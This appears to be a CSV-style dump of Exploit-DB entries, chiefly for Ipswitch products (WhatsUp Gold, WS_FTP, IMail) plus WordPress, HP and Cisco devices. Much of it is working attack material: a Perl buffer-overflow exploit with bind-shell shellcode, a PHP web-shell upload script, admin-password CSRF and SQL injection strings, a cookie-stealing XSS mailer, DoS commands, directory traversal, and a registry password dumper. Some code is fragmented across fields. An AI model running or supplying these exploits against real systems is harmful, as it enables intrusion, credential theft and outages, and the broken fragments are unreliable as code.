https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/31122.zip","Ipswitch Instant Messaging is prone to multiple security vulnerabilities, including a denial-of-service vulnerability, a format-string vulnerability, and a vulnerability that allows attackers to overwrite arbitrary files.
Attackers can exploit these issues to execute arbitrary code, cause denial-of-service conditions, or overwrite files with arbitrary content.
These issues affect Ipswitch Instant Messaging 2.0.8.1; other versions may also be affected."
2008-02-06,WebApps,ASP,Luigi Auriemma,Ipswitch WS_FTP Server 6,'/WSFTPSVR/FTPLogServer/LogViewer.asp' Authentication Bypass,"source: https://www.securityfocus.com/bid/27654/info
http://www.example.com/WSFTPSVR/FTPLogServer/LogViewer.asp","WS_FTP Server Manager is prone to an authentication-bypass vulnerability and an information-disclosure vulnerability.
An attacker can exploit these issues to gain unauthorized access to the affected application and gain access to potentially sensitive information.
These issues affect WS_FTP Server Manager 6.1.0.0; prior versions may also be affected."
2007-01-15,DoS,Windows,LMH,Ipswitch WS_FTP 2007 Professional,'WSFTPURL.exe' Local Memory Corruption,"// source: https://www.securityfocus.com/bid/22062/info
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/sockio.h>
/* if testing on PPC, you need to use the proper values. read netat/at_var.h */
#undefAF_APPLETALK
#define AIOCGETSTATE0x8021610b/* get AT global state */
#define AIOCREGLOCALZN0x8021610b
#define AT_ST_STARTED0x0001
#defineAF_APPLETALK0x10
/* check if AppleTalk stack has been started */","Ipswitch WS_FTP 2007 Professional is prone to a local memory-corruption vulnerability. This issue occurs when the 'wsbho2k0.dll' library fails to handle specially crafted arguments.
Due to the nature of this issue, an attacker may be able to execute arbitrary machine code in the context of the affected kernel, but this has not been confirmed. Failed exploit attempts result in kernel panics, denying service to legitimate users.
Ipswitch WS_FTP 2007 Professional is vulnerable to this issue; other versions may also be affected.
* Copyright 2006 (c) LMH <lmh@info-pull.com>.
* All Rights Reserved.
* ----
*               .--. .--.           _____________________________________
*          _..-: (X :  o :-.._     / heya! me Gruber Duckie. I'm an über |
*      .-''    `.__.:.__.'    ``-./___    proud zealot and Mac Beggar!   |
*    .'          .'   `.          `.  \__________________________________|
*   :  '.        :     :        .'  ;  (...fear my Delusional Zealot Army !)
*   :    :-..__  `.___.'  __..-;    ;
*   `.    `.   ''-------''   .'    ,'
*     `.    `.             .'    .'
*       `._   `-._     _.-'   _.'   kudos to ilja, kevin, hdm, johnnycsh, et al.
*          `-._   '""'""'   _.-'      proof of concept for MOKB-27-11-2006.
*              ``-------''
typedef struct at_state {
unsigned intflags;
} at_state_t;
char powder[4096];
unsigned long do_semtex(char *p, size_t len) {
int i;
size_t longsize = sizeof(long);
unsigned long *daringwussball;
daringwussball = (unsigned long *)p;
for (i = 0; i < len; i+=longsize) {
*daringwussball++ = 0x61;
return (unsigned long)&powder;
int main(int argc, char **argv) {
int fd;
at_state_t global_state;
unsigned long pkt;
if ((fd = socket(AF_APPLETALK, SOCK_RAW, 0)) < 0)
exit(1);
if (ioctl(fd, AIOCGETSTATE, &global_state) < 0) {
close(fd);
exit(2);
if (global_state.flags & AT_ST_STARTED) {
printf(""appletalk-exploit-1: 0x%08x\n"", global_state);
} else {
printf(""appletalk-exploit-1: AppleTalk isn't enabled!\n"");
exit(3);
pkt = do_semtex(powder, sizeof(powder));
ioctl(fd, AIOCREGLOCALZN, pkt);
close(fd);
return 0;"
2013-11-01,WebApps,PHP,Byakuya Kouta,WordPress Theme Switchblade 1.3,Arbitrary File Upload,"#_________            .___        _______                ___.   .__
#\_   ___ \  ____   __| _/____    \      \   ______  _  _\_ |__ |__| ____
#/    \  \/ /  _ \ / __ |/ __ \   /   |   \_/ __ \ \/ \/ /| __ \|  |/ __ \
#\     \___(  <_> ) /_/ \  ___/  /    |    \  ___/\     / | \_\ \  \  ___/
# \______  /\____/\____ |\___  > \____|__  /\___  >\/\_/  |___  /__|\___  >
#        \/            \/    \/          \/     \/            \/        \/
# Exploit Title: WordPress Switchblade Themes Arbitrary File Upload Vulnerability
# Author: Byakuya
# Date: 11/01/2013
# Vendor Homepage: http://themeforest.net/
# Themes Link: http://themeforest.net/item/switchblade-powerful-wordpress-theme/761353
# Price: $50
# Affected Version: v1.3
# Infected File: php.php
# Category: webapps/php
# Google dork: inurl:/wp-content/themes/switchblade
# Tested on : Windows/Linux
# Exploit & POC :
#File path:
http://127.0.0.1/wordpress/wp-content/uploads/[year]/[month]/up.php
#Credit: ./Byakuya ./Mr Ohsem ./Cai ./RatKid ./Agam ./Lord-Router ./X-Tuned ./Official Code-Newbie
#Facebook: https://www.facebook.com/CodeNewbieCrew
#Website: http://www.codenewbie.net
#Malaysia & Indonesia BlackHat","<?php
$uploadfile=""up.php"";
$ch = curl_init(""http://127.0.0.1/wordpress/wp-content/themes/switchblade/framework/_scripts/valums_uploader/php.php"");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('qqfile'=>""@$uploadfile""));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print ""$postResult"";"
2013-09-26,WebApps,Hardware,Hubert Gradek,Hewlett-Packard (HP) 2620 Switch Series. Edit Admin Account,Cross-Site Request Forgery,"# Exploit Title: Hewlett-Packard 2620 Switch Series. Edit Admin Account - CSRF Vulnerability
# Date: 26.09.2013r.
# Exploit Author: Hubert GrÄ…dek (PL)
# Software Link: [download link if available]
# Tested on: HP-E2620 24-PoEP //  RA.15.05.0006,ROMRA.15.10
http://[IP_ADDR]/html/json.html","HTTP Headers:
Host: [IP_ADDR]
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: pl,en-us;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://[IP_ADDR]/html/nhome.html
Cookie: sessionId=ANYTHING
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
POST Content:
method:setPassword&name=admin&password=newpassword&ext-comp-1171=newpassword&access=Manager"
2006-05-17,Remote,Hardware,Kenneth F. Belva,Ipswitch WhatsUp Professional 2006,Authentication Bypass,source: https://www.securityfocus.com/bid/18019/info,"Ipswitch WhatsUp Professional 2006 is susceptible to a remote authentication-bypass vulnerability.
This issue allows remote attackers to gain administrative access to the web-based administrative interface of the application. This will aid them in further network attacks.
The HTTP requests containing the following header information are sufficient to demonstrate this issue:
User-Agent: Ipswitch/1.0
User-Application: NmConsole"
2006-05-12,Remote,ASP,David Maciejak,Ipswitch WhatsUp Professional 2006,'/NmConsole/ToolResults.asp?sHostname' Cross-Site Scripting,"source: https://www.securityfocus.com/bid/17964/info
http://www.example.com:8022/NmConsole/utility/RenderMap.asp?nDeviceGroupID=2","WhatsUp Professional is prone to multiple input-validation vulnerabilities. The issues include remote file-include, information-disclosure, source-code disclosure, cross-site scripting, and input-validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
Successful exploits of these vulnerabilities could allow an attacker to access or modify data, steal cookie-based authentication credentials, perform username-enumeration, access sensitive information, and gain unauthorized access to script source code. Other attacks are also possible."
2006-05-12,Remote,ASP,David Maciejak,Ipswitch WhatsUp Professional 2006,'/NmConsole/Navigation.asp?sDeviceView' Cross-Site Scripting,"source: https://www.securityfocus.com/bid/17964/info
http://www.example.com:8022/NmConsole/Navigation.asp?"">[code]","WhatsUp Professional is prone to multiple input-validation vulnerabilities. The issues include remote file-include, information-disclosure, source-code disclosure, cross-site scripting, and input-validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
Successful exploits of these vulnerabilities could allow an attacker to access or modify data, steal cookie-based authentication credentials, perform username-enumeration, access sensitive information, and gain unauthorized access to script source code. Other attacks are also possible."
2006-02-22,DoS,ASP,Josh Zlatin-Amishav,Ipswitch WhatsUp Professional 2006,Remote Denial of Service,"source: https://www.securityfocus.com/bid/16771/info
http://www.example.com:81/NmConsole/Login.asp?bIsJavaScriptDisabled=true&sLoginPassword=&btnLogIn=[Log&In]=&sLoginUserName=
http://www.example.com:81/NmConsole/Login.asp?bIsJavaScriptDisabled=true&sLoginUserName=&btnLogIn=[Log&In]=&sLoginPassword=
http://www.example.com:81/NmConsole/Login.asp?bIsJavaScriptDisabled=true&sLoginUserName=&sLoginPassword=&In]=&btnLogIn=
http://www.example.com:81/NmConsole/Login.asp?bIsJavaScriptDisabled=true&sLoginUserName=&sLoginPassword=&btnLogIn=[Log&In]=","Ipswitch WhatsUp Professional 2006 is susceptible to a remote denial-of-service vulnerability. This issue is due to the application's failure to properly handle certain HTTP GET requests.
This issue allows remote attackers to consume excessive CPU resources on targeted computers, denying service to legitimate users.
An example script to exploit this issue is also available:
while [ 1 ]
do
wget -O /dev/null http://www.example.com:81/NmConsole/Login.asp?bIsJavaScriptDisabled=true&sLoginPassword=&b;tnLogIn=[Log&In]=&sLoginUserName=
done"
2005-12-14,DoS,Hardware,Justin M. Wray,Cisco Catalyst Switches (Multiple Devices),LanD Packet Denial of Service,source: https://www.securityfocus.com/bid/15864/info,"Multiple unspecified Cisco Catalyst switches are prone to a denial of service vulnerability.
These devices are susceptible to a remote denial of service vulnerability when handling TCP 'LanD' packets.
This issue allows remote attackers to crash affected devices, or to temporarily block further network routing functionality. This will deny further network services to legitimate users.
As no specific Cisco devices were identified by the reporter of this issue, all Cisco Catalyst devices have been marked as vulnerable. This BID will be updated as further information on affected packages is available.
hping2 -A -S -P -U 1.2.3.4 -s 80 -p 80 -a 192.168.1.1"
2005-11-03,Remote,Windows,Dennis Rand,IPSwitch WhatsUp Small Business 2004 Report Service,Directory Traversal,"source: https://www.securityfocus.com/bid/15291/info
http://[address of server]:8022/../../../../../../../../../../../boot.ini",IPSwitch WhatsUp Small Business 2004 is prone to a directory traversal vulnerability. Successful exploitation could allow a remote attacker to gain access to files outside the Web root. Sensitive information may be obtained in this manner.
2005-06-22,WebApps,ASP,anonymous,Ipswitch WhatsUp Professional 2005 SP1,'login.asp' SQL Injection,source: https://www.securityfocus.com/bid/14039/info,"WhatsUp Professional is prone to an SQL injection vulnerability affecting its Web-based front end. This issue is due to a failure in the application to properly sanitize user-supplied input to the 'login.asp' script before using it in an SQL query.
Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation. It should be noted that by supplying a 'or' value through the 'password' parameter, an attacker can gain unauthorized access to an affected site.
The following proof of concept is available:
Reset the Admin user password with a blank password:
- 'UPDATE WebUser SET sPassword=DEFAULT WHERE sUserName='Admin'--
Elevate Guest user privileges to Admin privileges:
- 'UPDATE WebUser SET nUserRightsMask=-1 WHERE sUserName='guest'--"
2013-04-29,WebApps,Windows,DaOne,Ipswitch IMail 11.01,Cross-Site Scripting,"#!/usr/bin/perl
# Exploit Title: Ipswitch IMail 11.01 XSS Vulnerability
# Date: 26-04-2013
# Author: DaOne  aka Mocking Bird
# Vendor Homepage: http://www.ipswitch.com/
# Platform: windows
# ARGV Check
# Config SMTP
# Attacker and Victim email
# Send email
# Proof http://oi40.tinypic.com/34yw8hz.jpg","use Net::SMTP;
if ($#ARGV != 2)
print ""\nUSAGE: IMail.pl <Mail Server> <Attacker Email> <VicTim Email>\n"";
exit;
$host = $ARGV[0];
$attacker = $ARGV[1];
$victim = $ARGV[2];
$smtp = Net::SMTP->new(  Host => $host,
Hello => 'Hello world',
Timeout => 30)
or die ""Couldn't connect to Mail Server\n"";
$smtp->mail($attacker);
$smtp->to($victim);
$buffer = ""From: XSS\n"".
""To: testing\n"".
""Subject: testing\n"".
""MIME-Version: 1.0\n"".
""Content-Type: multipart/mixed;\n"".
""    boundary=\""--=45145578442838848853975045745715171602582966277178406402638054315034128543847104614337851625097187549984363453814450535441019\""\n\n"".
""----=45145578442838848853975045745715171602582966277178406402638054315034128543847104614337851625097187549984363453814450535441019\n"".
""Content-Type: text/html;\n"".
""charset=\""utf-8\""\n"".
""Content-Transfer-Encoding: quoted-printable\n\n"".
""XSS\n"".
""<!DOCTYPE HTML PUBLIC \""-//W3C//DTD HTML 4.0 Transitional//EN\"">\n"".
""<HTML><BODY>\n"".
""<script >alert(document.cookie)</script >\n"".
""</BODY></HTML>\n\n"".
""----=45145578442838848853975045745715171602582966277178406402638054315034128543847104614337851625097187549984363453814450535441019--"";
$smtp->data();
$smtp->datasend($buffer);
$smtp->quit();
print ""Send.\n"";"
2004-09-03,Remote,Windows,anonymous,Ipswitch WhatsUp Gold 7.0/8.0,Notification Instance Name Remote Buffer Overflow,"source: https://www.securityfocus.com/bid/11109/info
#!/usr/bin/perl
#  [LoWNOISE] NotmuchG.pl  v.1.5
# ================================================
#  IPSWITCH WhatsUp Gold ver8.03 Remote Buffer Overflow Exploit
# ================================================
# Exploit by ET LoWNOISE  Colombia
# et(at)cyberspace.org
# Oct/2004
# Tested on WIN2K SP4
# The exploit takes control by overwriting the pointer of a Structured Exception Handler,
# installed by WhatsUP and points to a routine that handles exceptions.
# (http://www.thc.org/papers/Practical-SEH-exploitation.pdf Johnny Cyberpunk THC)
# The overflow string has to be around 4080 in length to generate an exception that can
# be manipulated by changing the SEH pointer (ret [815]).
# Bug Discovered by
# iDEFENSE  Security Advisory 08.25.04
# http://www.idefense.com/application/poi/display?type=vulnerabilities
# Greetz to the midget, the m3 and los parces , the seltiks, p0ch1n,Ritt3r,Mav, f4lc0n..
# Bind shellcode port 28876  (HDM,  metasploit.org)
http://127.0.0.1/NotifyAction.asp?action=AddType&instance=Beeper&end=end\r\n"";
#[-------815-------------] [ret] [-------------4080---------]
#[A.....811...A][jmp] [ret] [nops][shc][E.......E ]
#$cmd .= ""\xfe\x63\xa1\x71""; #winXP SP1 ws2help.dll
#$cmd .= ""LOWNOISE"";        #garbage :D","The Ipswitch WhatsUp Gold web interface is prone to a remotely exploitable buffer overflow vulnerability. This may be exploited by authenticated users of the interface to execute arbitrary code in the context of the program.
use strict;
use IO::Socket::INET;
usage() unless (@ARGV == 2);
my $host = shift(@ARGV);
my $port = shift(@ARGV);
my $shellcode =
""\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52"".
""\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1"".
""\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a"".
""\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"".
""\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b"".
""\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32"".
""\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff"".
""\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe"".
""\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50"".
""\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff"".
""\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89"".
""\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff"".
""\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x6a"".
""\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x24\xff\xff\xff\x31\xdb"".
""\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x50\x50\x50\x53\x53\x31\xc0"".
""\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x6a\x44"".
""\x89\xe6\x50\x55\x53\x53\x53\x53\x54\x56\x53\x53\x53\x43\x53\x4b"".
""\x53\x53\x51\x53\x89\xfd\xbb\x21\xd0\x05\xd0\xe8\xe2\xfe\xff\xff"".
""\x31\xc0\x48\x8b\x44\x24\x04\xbb\x43\xcb\x8d\x5f\xe8\xd1\xfe\xff"".
""\xff\x5d\x5d\x5d\xbb\x12\x6b\x6d\xd0\xe8\xc4\xfe\xff\xff\x31\xc0"".
""\x50\x89\xfd\xbb\x69\x1d\x42\x3a\xe8\xb5\xfe\xff\xff"";
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host,
PeerPort=>$port);
$socket or die ""Cannot connect to the host.\n"";
$socket->autoflush(1);
print $socket ""POST /_maincfgret.cgi HTTP/1.0\r\n"";
print $socket ""Accept: image/gif, image/x-xbitmap, image/jpeg,
image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel,
application/msword, application/x-shockwave-flash,
application/vnd.citrix.AdvGWClient-2_2, */*\r\n"";
print $socket ""Referer:
print $socket ""Accept-Language: en-us\r\nContent-Type:
application/x-www-form-urlencoded\r\nConnection: Keep-Alive\r\n"";
print $socket ""User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT
5.1; T312461; .NET CLR 1.1.4322)\r\n"";
print $socket ""Host: 127.0.0.1\r\nContent-Length: "";
my $cmd =""page=notify&origname=&action=return&type=Beeper&instancename="";
$cmd .= ""A""x811; #815 -4
$cmd .= ""\xeb\x06\x90\x90""; #jumper <eb + 06> <garbage> jmp to shellcode
$cmd .= ""\xc4\x2a\x02\x75"";  #win2k sp0-sp4 ws2help.dll
$cmd .= ""\x90""x2080;
$cmd .= $shellcode;
$cmd .= ""E""x(2000-length($shellcode)); #mas basura
$cmd .= ""&beepernumber=&upcode=0*&downcode=9*&trapcode=6*&end=end"";
print $socket length($cmd).""\r\nPragma: no-cache\r\nAuthorization: Basic
YWRtaW46YWRtaW4=\r\n\r\n"";
print $socket $cmd.""\r\n"";
close($socket);
exit(0);
sub usage
print ""\n[LoWNOISE] IPSWITCH WhatsUp Gold 8.03 Remote fr33 exploit\n"";
print ""===================================================\n"";
print ""\nUsage: NotmuchG.pl [host] [port]\n"";
print ""[host]  Target host\n[port]  WhatsUp webserver port\n\n"";
print ""\n Shell on tcp port 28876.\n\n"";
print ""ET LoWNOISE 2004\n"";
exit(1);"
2004-08-30,DoS,Windows,lion,Ipswitch WS_FTP Server 5.0.x,CD Command Malformed File Path Remote Denial of Service,source: https://www.securityfocus.com/bid/11065/info,"WS_FTP Server is reported prone to a remote denial of service vulnerability. This issue presents itself when the application processes a malformed file path through the 'cd' command.
WS_FTP Server version 5.0.2 is reported prone to this issue, however, other versions may be affected as well.
E:\>ftp localhost
Connected to ibm.
220-ibm X2 WS_FTP Server 5.0.2.EVAL (106633167)
220-Fri Aug 27 14:12:19 2004
220-29 days remaining on evaluation.
220 ibm X2 WS_FTP Server 5.0.2.EVAL (106633167)
User (ibm:(none)): ftp
331 Password required
Password:
230 user logged in
ftp> cd a../a
Connection closed by remote host."
1999-12-20,Local,Windows,Adik,Ipswitch IMail Server 7/8,Weak Password Encryption,"// source: https://www.securityfocus.com/bid/10956/info
//#include ""stdafx.h""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <windows.h>
#define snprintf        _snprintf
#pragma comment(lib,""advapi32"")
#define ALLOWED_USERNAME_CHARS  ""A-Z,a-z,0-9,-,_,.""
#define MAX_NUM 1024 //500
#define DOMAINZ ""Software\\IpSwitch\\IMail\\Domains""
#define VER     ""1.1""
#define MAXSIZE 100
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
//netmaniacnetmaniacnetman
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
//adik 123456
//adikbek 123
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
//return;
// adik 1234567
// adik 12
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
//adik
//total_domains += dom
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
//dump passwd from registry
//decrypt username passwd
// ThE eNd
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/","Ipswitch IMail is reported to use a weak encryption algorithm when obfuscating saved passwords. A local attacker who has the ability to read the encrypted passwords may easily derive the plaintext password if the username that is associated with the password is known.
A local attacker may exploit this weakness to disclose user credentials.
*       IpSwitch IMail Server <= ver 8.1 User Password Decryption
*       by Adik < netmaniac[at]hotmail.KG >
*       IpSwitch IMail Server uses weak encryption algorithm to encrypt its user passwords. It uses
*       polyalphabetic Vegenere cipher to encrypt its user passwords. This encryption scheme is
*       relatively easy to break. In order to decrypt user password we need a key. IMail uses username
*       as a key to encrypt its user passwords. The server stores user passwords in the registry under the key
*       ""HKEY_LOCAL_MACHINE\SOFTWARE\IpSwitch\IMail\Domains\<domainname>\Users\<username>\Password"".
*       Before decrypting password convert all upper case characters in the username to lower case
*       characters. We use username as a key to decrypt our password.
*       In order to get our plain text password, we do as follows:
*       1) Subtract hex code of first password hash character by the hex code of first username character.
*          The resulting hex code will be our first decrypted password character.
*       2) Repeat above step for the rest of the chars.
*       Look below, everythin is dead simple ;)
*       eg:
*       USERNAME:               netmaniac
*       PASSWORDHASH:   D0CEE7D5CCD3D4C7D2E0CAEAD2D3
*       --------------------------------------------
*       D0 CE E7 D5 CC D3 D4 C7 D2 E0 CA EA D2 D3       <- password hash
* -     6E 65 74 6D 61 6E 69 61 63 6E 65 74 6D 61       <- hex codes of username
*       n  e  t  m  a  n  i  a  c  n  e  t  m  a        <- username is a key
*       -----------------------------------------
*       62 69 73 68 6B 65 6B 66 6F 72 65 76 65 72       <- hex codes of decrypted password
*       b  i  s  h  k  e  k  f  o  r  e  v  e  r        <- actual decrypted password
*       pwdhash_hex_code                username_hex_code               decrypted_password
*       ------------------------------------------------------------------
*                       D0                      -               6E (n)                  =       62 (b)
*                       CE                      -               65 (e)                  =       69 (i)
*                       E7                      -               74 (t)                  =       73 (s)
*                       D5                      -               6D (m)                  =       68 (h)
*                       CC                      -               61 (a)                  =       6B (k)
*                       D3                      -               6E (n)                  =       65 (e)
*                       D4                      -               69 (i)                  =       6B (k)
*                       C7                      -               61 (a)                  =       66 (f)
*                       D2                      -               63 (c)                  =       6F (o)
*                       E0                      -               6E (n)                  =       72 (r)
*                       CA                      -               65 (e)                  =       65 (e)
*                       EA                      -               74 (t)                  =       76 (v)
*                       D2                      -               6D (m)                  =       65 (e)
*                       D3                      -               61 (a)                  =       72 (r)
*       ------------------------------------------------------------------
*       I've included a lil proggie to dump all the usernames/passwords from local machine's registry.
*       Have fun!
*       //Send bug reports to netmaniac[at]hotmail.KG
*       Greets to: my man wintie from .au, Chintan Trivedi :), jin yean ;), Morphique
*       [16/August/2004] Bishkek
int total_accs=0;
int total_domainz=0,total_domain_accs=0;
void greetz()
printf( ""\n\t--= [ IpSwitch IMail Server User Password Decrypter ver %s] =--\n\n""
""\t\t (c) 2004 by Adik ( netmaniac [at] hotmail.KG )\n\n\n"",VER);
void usage()
printf( ""------------------------------------------------------------------------\n"");
printf( "" Imailpwdump [-d] -- Dumps IMail Server user/pwds from local registry\n\n""
"" Imailpwdump [username] [passwordhash] -- User/PwdHash to decrypt\n\n""
"" eg: Imailpwdump netmaniac D0CEE7D5CCD3D4C7D2E0CAEAD2D3\n"");
printf( ""------------------------------------------------------------------------\n"");
void str2hex(char *hexstring, char *outbuff)
unsigned long tmp=0;
char tmpchr[5]="""";
memset(outbuff,0,strlen(outbuff));
if(strlen(hexstring) % 2)
printf("" Incorrect password hash!\n"");
exit(1);
if(strlen(hexstring)>MAXSIZE)
printf("" Password hash is too long! \n"");
exit(1);
for(unsigned int i=0, c=0; i<strlen(hexstring); i+=2, c++)
memcpy(tmpchr,hexstring+i,2);
tmp = strtoul(tmpchr,NULL,16);
outbuff[c] = (char)tmp;
void str2smallcase(char *input)
if(strlen(input)>MAXSIZE)
printf("" Username too long! \n"");
return;
for(unsigned int i=0;i<strlen(input);i++)
if(isalnum(input[i]) || input[i] == '-' || input[i]=='_' || input[i]=='.')
input[i] = tolower(input[i]);
else
printf("" Bad characters in username!\n Allowed characters: %s\n"",ALLOWED_USERNAME_CHARS);
return;
void populate(char *input,unsigned int size)
char tmp[MAX_NUM]="""";
unsigned int strl = strlen(input);
strcpy(tmp,input);
for(unsigned int i=strlen(input),c=0;i<size;i++,c++)
if(c==strl)
c=0;
input[i] = tmp[c];
input[i]='\0';
void imail_decrypt(char *username, char *pwdhash,char *outbuff)
if(strlen(pwdhash) <= strlen(username) )
memset(outbuff,0,sizeof(outbuff));
for(unsigned int i=0;i<strlen(pwdhash);i++)
outbuff[i] = (pwdhash[i]&0xff) - (username[i]&0xff);
outbuff[i]='\0';
void get_usr_pwds(char *subkey,char *usr)
long res;
HKEY hPwdKey;
char username[MAXSIZE]="""";
char passwdhash[MAXSIZE*2]="""", passwd[MAXSIZE]="""",clearpasswd[MAXSIZE]="""";
char fullname[MAXSIZE]="""";
char email[MAXSIZE]="""";
DWORD lType;
DWORD passwdhashsz=sizeof(passwdhash)-1,fullnamesz=MAXSIZE-1,emailsz=MAXSIZE-1;
res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,subkey,0,KEY_ALL_ACCESS,&hPwdKey);
if(res!=ERROR_SUCCESS)
printf("" Error opening key %s! Error #:%d\n"",subkey,res);
exit(1);
if(RegQueryValueEx(hPwdKey,""Password"",0,&lType,(LPBYTE)passwdhash,&passwdhashsz)!= ERROR_SUCCESS)
RegCloseKey(hPwdKey);
return;
if(RegQueryValueEx(hPwdKey,""FullName"",0,&lType,(LPBYTE)fullname,&fullnamesz)!= ERROR_SUCCESS)
RegCloseKey(hPwdKey);
return;
if(RegQueryValueEx(hPwdKey,""MailAddr"",0,&lType,(LPBYTE)email,&emailsz)!=ERROR_SUCCESS)
RegCloseKey(hPwdKey);
return;
str2smallcase(usr);
strncpy(username,usr,sizeof(username)-1);
str2hex(passwdhash,passwd);
if(strlen(passwd)>strlen(username))
populate(username,strlen(passwd));
imail_decrypt(username,passwd,clearpasswd);
printf( ""------------------------------------------------------------------------\n""
"" FullName:\t %s\n""
"" Email:\t\t %s\n""
"" Username:\t %s\n""
"" Password:\t %s\n"",
fullname,email,usr,clearpasswd);
total_accs++;
RegCloseKey(hPwdKey);
void dump_registry_pwds()
HKEY hKey,hUserKey;
DWORD domRes=0,usrRes=0, domlen=0,userlen=0,domIndex=0,userIndex=0;
FILETIME ftime;
char domain[150]="""";
char user[150]="""";
char tmpbuff[MAX_NUM]="""";
char usrtmpbuff[MAX_NUM]="""";
domRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE,DOMAINZ,0,KEY_ALL_ACCESS,&hKey);
if(domRes!=ERROR_SUCCESS)
printf("" Error opening key '%s'!\n IMail not installed?? Error #:%d\n"",DOMAINZ,domRes);
exit(1);
do
domlen=sizeof(domain)-1;
domRes=RegEnumKeyEx(hKey,domIndex,domain,&domlen,NULL,NULL,NULL,&ftime);
if(domRes!=ERROR_NO_MORE_ITEMS)
printf(""\n DOMAIN:\t [ %s ]\n"",domain);
userIndex=0;
total_accs=0;
snprintf(tmpbuff,sizeof(tmpbuff)-1,""%s\\%s\\Users"",DOMAINZ,domain);
usrRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE,tmpbuff,0,KEY_ALL_ACCESS,&hUserKey);
if(usrRes==ERROR_SUCCESS)
do
userlen=sizeof(user)-1;
usrRes=RegEnumKeyEx(hUserKey,userIndex,user,&userlen,NULL,NULL,NULL,&ftime);
if(usrRes!=ERROR_NO_MORE_ITEMS)
snprintf(usrtmpbuff,sizeof(usrtmpbuff)-1,""%s\\%s\\Users\\%s"",DOMAINZ,domain,user);
get_usr_pwds(usrtmpbuff,user);
userIndex++;
while(usrRes!=ERROR_NO_MORE_ITEMS);
RegCloseKey(hUserKey);
printf(""\n\t Total:\t %d Accounts\n"",total_accs);
total_domain_accs += total_accs;
total_domainz++;
